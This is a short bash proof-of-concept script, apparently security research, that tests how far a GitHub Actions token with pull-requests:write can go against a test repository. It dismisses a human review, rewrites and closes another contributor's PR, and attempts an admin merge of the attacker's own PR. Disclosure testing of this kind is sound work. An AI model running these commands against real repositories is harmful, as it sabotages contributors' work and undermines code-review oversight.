#!/usr/bin/env bash
# Round 4: push toward the actual ceiling of what pull-requests:write + contents:read
# grants. Testing against PR #2 (the unrelated "victim" PR) and PR #1 (attacker's own).
set -euo pipefail
REPO="mrityunjayk-hash/poc-ci-fork-checkout-mechanism"

echo "=== TEST A: dismiss a human-authored review on PR #2 ==="
gh api -X PUT "repos/$REPO/pulls/2/reviews/5427345735/dismissals" \
  -f message="Dismissed by the PoC payload" \
  && echo "RESULT: dismissing a human review SUCCEEDED" \
  || echo "RESULT: dismissing a human review FAILED"

echo "=== TEST B: edit PR #2's title/body ==="
gh pr edit 2 --title "[EDITED BY POC PAYLOAD] Add a small doc note" \
  --body "This body was rewritten by the PoC payload, running from PR #1's workflow dispatch." \
  && echo "RESULT: editing a different PR's title/body SUCCEEDED" \
  || echo "RESULT: editing a different PR's title/body FAILED"

echo "=== TEST C: close PR #2 (sabotage - someone else's legitimate PR) ==="
gh pr close 2 --comment "Closed by the PoC payload (will be reopened immediately after for repo hygiene)." \
  && echo "RESULT: closing a different PR SUCCEEDED" \
  || echo "RESULT: closing a different PR FAILED"

echo "=== TEST D: reopen PR #2 (cleanup, not part of the claim) ==="
gh pr reopen 2 || echo "reopen failed or not needed"

echo "=== TEST E: merge attacker's OWN PR (#1) -- tests the contents:read ceiling ==="
gh pr merge 1 --merge --admin \
  && echo "RESULT: merge SUCCEEDED (would be a much bigger finding)" \
  || echo "RESULT: merge FAILED (expected -- contents:read should block this)"
